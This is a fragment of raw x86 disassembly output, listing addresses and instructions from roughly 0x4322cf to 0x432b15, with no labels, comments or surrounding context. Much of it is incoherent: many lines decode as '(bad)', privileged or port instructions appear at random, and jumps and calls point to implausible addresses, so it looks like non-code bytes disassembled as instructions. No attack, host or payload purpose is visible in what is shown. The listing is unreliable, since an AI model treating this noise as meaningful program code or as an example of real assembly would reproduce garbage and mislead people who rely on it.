  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
